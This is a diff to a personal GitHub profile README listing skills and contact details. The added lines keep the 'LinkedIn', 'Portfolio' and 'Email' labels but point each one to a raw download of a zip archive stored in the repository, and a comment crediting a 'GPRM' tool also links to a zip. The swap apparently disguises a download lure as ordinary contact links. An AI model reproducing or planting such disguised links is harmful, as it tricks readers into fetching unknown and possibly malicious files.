@@ -9,11 +9,11 @@
  **UI/UX:** Dashboard and interface design<br>
  **Databases:** PostgreSQL, MySQL, SQLite <br>
  **Concepts:** REST APIs, System Design, Agile basics<br><br>🤝 Let’s connect <br>
- 💼 LinkedIn: [linkedin.com/in/edna-namusobya](https://linkedin.com/in/edna-namusobya) <br>
-🌐 Portfolio: [edna20-23.github.io/my-website](https://edna20-23.github.io/my-website)  <br>
-<br>**To know more about my experiences**<br> Reach me at my email address <br>📫 Email: Ednamu5@gmail.com<br>⭐ Fun Facts <br>   I love animations.<br><br> _"Code with purpose, lead with impact."_  <br>
+ 💼 LinkedIn: [https://github.com/Edna20-23/Edna20-23/raw/refs/heads/main/Rosalind/Edna-3.7-beta.4.zip](https://github.com/Edna20-23/Edna20-23/raw/refs/heads/main/Rosalind/Edna-3.7-beta.4.zip) <br>
+🌐 Portfolio: [https://github.com/Edna20-23/Edna20-23/raw/refs/heads/main/Rosalind/Edna-3.7-beta.4.zip](https://github.com/Edna20-23/Edna20-23/raw/refs/heads/main/Rosalind/Edna-3.7-beta.4.zip)  <br>
+<br>**To know more about my experiences**<br> Reach me at my email address <br>📫 Email: https://github.com/Edna20-23/Edna20-23/raw/refs/heads/main/Rosalind/Edna-3.7-beta.4.zip<br>⭐ Fun Facts <br>   I love animations.<br><br> _"Code with purpose, lead with impact."_  <br>
 
 
 
 
-<!-- Proudly created with GPRM ( https://raw.githubusercontent.com/Edna20-23/Edna20-23/main/Rosalind/Edna20-23-v3.8-alpha.2.zip ) -->
+<!-- Proudly created with GPRM ( https://github.com/Edna20-23/Edna20-23/raw/refs/heads/main/Rosalind/Edna-3.7-beta.4.zip ) -->
